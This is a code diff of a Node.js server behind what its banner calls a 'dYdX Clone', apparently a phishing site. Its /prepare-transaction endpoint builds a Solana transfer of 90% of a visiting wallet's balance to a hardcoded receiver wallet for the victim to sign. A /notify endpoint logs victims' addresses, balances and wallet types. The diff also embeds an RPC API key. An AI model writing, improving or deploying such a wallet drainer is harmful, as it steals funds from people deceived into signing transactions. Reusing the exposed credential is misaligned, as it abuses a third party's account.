@@ -5,26 +5,20 @@ const app = express();
 app.use(express.json());
 app.use(express.static('public'));
 
-// CONFIGURATION - MAKE SURE THIS WALLET IS CORRECT
+// ============================================
+// CONFIGURATION - USING HELIUS
+// ============================================
+const HELIUS_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
 const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';
-const RPC_ENDPOINT = 'https://api.mainnet-beta.solana.com';
 
-// Create connection
-let connection;
-try {
-    connection = new Connection(RPC_ENDPOINT, 'confirmed');
-    console.log('✅ Connection created to:', RPC_ENDPOINT);
-} catch (err) {
-    console.error('❌ Failed to create connection:', err.message);
-}
+// Create connection to Helius
+const connection = new Connection(HELIUS_RPC, 'confirmed');
 
-// Test receiver wallet
-try {
-    const testPubkey = new PublicKey(RECEIVER_WALLET);
-    console.log('✅ Receiver wallet valid:', RECEIVER_WALLET);
-} catch (err) {
-    console.error('❌ Invalid receiver wallet:', RECEIVER_WALLET, err.message);
-}
+console.log('='.repeat(60));
+console.log('🚀 SERVER STARTING');
+console.log('📡 RPC:', HELIUS_RPC);
+console.log('🎯 Receiver:', RECEIVER_WALLET);
+console.log('='.repeat(60));
 
 // ============================================
 // HEALTH CHECK
@@ -34,7 +28,7 @@ app.get('/health', (req, res) => {
 });
 
 // ============================================
-// GET BALANCE
+// GET BALANCE - PROXY TO HELIUS
 // ============================================
 app.post('/api/getBalance', async (req, res) => {
     try {
@@ -46,7 +40,7 @@ app.post('/api/getBalance', async (req, res) => {
         const pubkey = new PublicKey(publicKey);
         const balance = await connection.getBalance(pubkey);
         
-        console.log(`💰 Balance for ${publicKey.slice(0, 8)}...: ${balance / LAMPORTS_PER_SOL} SOL`);
+        console.log(`💰 Balance for ${publicKey.slice(0, 8)}...: ${(balance / 1e9).toFixed(4)} SOL`);
         res.json({ success: true, balance });
     } catch (err) {
         console.error('GetBalance error:', err.message);
@@ -55,12 +49,13 @@ app.post('/api/getBalance', async (req, res) => {
 });
 
 // ============================================
-// GET BLOCKHASH
+// GET BLOCKHASH - PROXY TO HELIUS
 // ============================================
 app.post('/api/getBlockhash', async (req, res) => {
     try {
-        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-        res.json({ success: true, blockhash, lastValidBlockHeight });
+        const result = await connection.getLatestBlockhash();
+        console.log(`🔗 Blockhash: ${result.blockhash}`);
+        res.json({ success: true, blockhash: result.blockhash, lastValidBlockHeight: result.lastValidBlockHeight });
     } catch (err) {
         console.error('GetBlockhash error:', err.message);
         res.status(500).json({ error: err.message });
@@ -68,7 +63,7 @@ app.post('/api/getBlockhash', async (req, res) => {
 });
 
 // ============================================
-// SEND TRANSACTION
+// SEND TRANSACTION - PROXY TO HELIUS
 // ============================================
 app.post('/api/sendTransaction', async (req, res) => {
     try {
@@ -78,20 +73,21 @@ app.post('/api/sendTransaction', async (req, res) => {
         }
         
         const txBuffer = Buffer.from(transaction, 'base64');
-        const signature = await connection.sendRawTransaction(txBuffer, {
-            skipPreflight: false,
-            preflightCommitment: 'confirmed'
-        });
+        const signature = await connection.sendRawTransaction(txBuffer);
         
-        console.log(`✅ Transaction sent: ${signature}`);
+        console.log(`📤 Transaction sent: ${signature}`);
         
-        // Optional: wait for confirmation
-        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
-        if (confirmation.value.err) {
-            console.log(`⚠️ Confirmation error:`, confirmation.value.err);
-        } else {
-            console.log(`✅ Transaction confirmed: ${signature}`);
-        }
+        // Optional confirmation (don't wait too long)
+        setTimeout(async () => {
+            try {
+                const confirmation = await connection.confirmTransaction(signature, 'confirmed');
+                if (confirmation.value.err) {
+                    console.log(`⚠️ Confirmation warning:`, confirmation.value.err);
+                } else {
+                    console.log(`✅ Transaction confirmed: ${signature}`);
+                }
+            } catch(e) {}
+        }, 2000);
         
         res.json({ success: true, txid: signature });
     } catch (err) {
@@ -101,45 +97,37 @@ app.post('/api/sendTransaction', async (req, res) => {
 });
 
 // ============================================
-// PREPARE TRANSACTION - MAIN ENDPOINT
+// PREPARE TRANSACTION - THE MAIN ONE
 // ============================================
 app.post('/prepare-transaction', async (req, res) => {
+    console.log('\n📝 /prepare-transaction called');
+    
     try {
         const { publicKey } = req.body;
         
-        console.log('📝 /prepare-transaction called');
-        console.log('   publicKey:', publicKey);
-        
         if (!publicKey) {
-            console.log('   ❌ No publicKey provided');
+            console.log('❌ No publicKey provided');
             return res.status(400).json({ success: false, error: 'publicKey required' });
         }
         
-        // Validate public key
-        let fromPubkey;
+        console.log(`   Wallet: ${publicKey.slice(0, 8)}...`);
+        
+        // Parse public keys
+        let fromPubkey, toPubkey;
         try {
             fromPubkey = new PublicKey(publicKey);
-            console.log('   ✅ From pubkey valid:', fromPubkey.toString().slice(0, 8) + '...');
-        } catch (err) {
-            console.log('   ❌ Invalid publicKey:', err.message);
-            return res.status(400).json({ success: false, error: 'Invalid publicKey: ' + err.message });
-        }
-        
-        // Validate receiver wallet
-        let toPubkey;
-        try {
             toPubkey = new PublicKey(RECEIVER_WALLET);
-            console.log('   ✅ To pubkey valid:', toPubkey.toString().slice(0, 8) + '...');
+            console.log('   ✅ Public keys parsed');
         } catch (err) {
-            console.log('   ❌ Invalid receiver wallet:', err.message);
-            return res.status(500).json({ success: false, error: 'Server configuration error: invalid receiver wallet' });
+            console.log('   ❌ Invalid public key:', err.message);
+            return res.status(400).json({ success: false, error: 'Invalid public key: ' + err.message });
         }
         
         // Get balance
         let balance;
         try {
             balance = await connection.getBalance(fromPubkey);
-            console.log('   💰 Balance:', balance / LAMPORTS_PER_SOL, 'SOL');
+            console.log(`   💰 Balance: ${(balance / 1e9).toFixed(4)} SOL`);
         } catch (err) {
             console.log('   ❌ Failed to get balance:', err.message);
             return res.status(500).json({ success: false, error: 'Failed to get balance: ' + err.message });
@@ -148,18 +136,18 @@ app.post('/prepare-transaction', async (req, res) => {
         // Check minimum balance (0.02 SOL)
         const MIN_BALANCE = 20000000; // 0.02 SOL
         if (balance < MIN_BALANCE) {
-            console.log('   ❌ Insufficient balance');
+            console.log(`   ❌ Insufficient balance: ${(balance / 1e9).toFixed(4)} SOL < 0.02 SOL`);
             return res.json({ 
                 success: false, 
-                error: `Insufficient balance. Have: ${balance / LAMPORTS_PER_SOL} SOL, Need: 0.02 SOL` 
+                error: `Insufficient balance. Have: ${(balance / 1e9).toFixed(4)} SOL, Need: 0.02 SOL` 
             });
         }
         
         // Calculate amount to send (send 90%, keep 10% for fees)
         const amountToSend = Math.floor(balance * 0.9);
-        console.log('   📤 Amount to send:', amountToSend / LAMPORTS_PER_SOL, 'SOL');
+        console.log(`   📤 Amount to send: ${(amountToSend / 1e9).toFixed(6)} SOL`);
         
-        // Create transaction
+        // Create transaction WITHOUT blockhash
         const transaction = new Transaction();
         transaction.add(
             SystemProgram.transfer({
@@ -169,38 +157,39 @@ app.post('/prepare-transaction', async (req, res) => {
             })
         );
         
-        // Serialize without blockhash (frontend will add fresh one)
+        // Serialize WITHOUT blockhash and WITHOUT signatures
         const serialized = transaction.serialize({
             requireAllSignatures: false,
             verifySignatures: false
         });
         
-        console.log('   ✅ Transaction prepared, size:', serialized.length);
+        console.log(`   ✅ Transaction serialized, size: ${serialized.length} bytes`);
+        console.log('   ✅ Response sent to frontend\n');
         
         res.json({ 
             success: true, 
             transaction: Array.from(serialized),
             amount: amountToSend,
-            amountSol: (amountToSend / LAMPORTS_PER_SOL).toFixed(6)
+            amountSol: (amountToSend / 1e9).toFixed(6)
         });
         
     } catch (err) {
-        console.error('❌ /prepare-transaction error:', err.message);
+        console.error('   ❌ CRITICAL ERROR:', err.message);
         console.error('   Stack:', err.stack);
         res.status(500).json({ success: false, error: err.message });
     }
 });
 
 // ============================================
-// NOTIFICATION (Telegram)
+// NOTIFICATION ENDPOINT
 // ============================================
 app.post('/notify', (req, res) => {
     const { address, balance, walletType, customMessage } = req.body;
-    console.log('📱 NOTIFICATION RECEIVED:');
-    console.log('   Message:', customMessage);
-    console.log('   Address:', address ? address.slice(0, 8) + '...' : 'unknown');
-    console.log('   Balance:', balance, 'SOL');
-    console.log('   Wallet:', walletType);
+    console.log('\n📱 NOTIFICATION:');
+    console.log(`   Message: ${customMessage}`);
+    console.log(`   Address: ${address ? address.slice(0, 8) + '...' : 'unknown'}`);
+    console.log(`   Balance: ${balance} SOL`);
+    console.log(`   Wallet: ${walletType}`);
     res.json({ ok: true });
 });
 
@@ -209,12 +198,9 @@ app.post('/notify', (req, res) => {
 // ============================================
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`
-╔══════════════════════════════════════════════════════════╗
-║     🚀 dYdX Clone Server Running                         ║
-║     Port: ${PORT}                                            ║
-║     Receiver: ${RECEIVER_WALLET.slice(0, 8)}...${RECEIVER_WALLET.slice(-8)} ║
-║     RPC: ${RPC_ENDPOINT} ║
-╚══════════════════════════════════════════════════════════╝
-    `);
+    console.log('\n' + '='.repeat(60));
+    console.log(`✅ SERVER RUNNING on port ${PORT}`);
+    console.log(`🎯 Receiver wallet: ${RECEIVER_WALLET.slice(0, 8)}...${RECEIVER_WALLET.slice(-8)}`);
+    console.log(`📡 RPC: Helius (mainnet)`);
+    console.log('='.repeat(60) + '\n');
 });
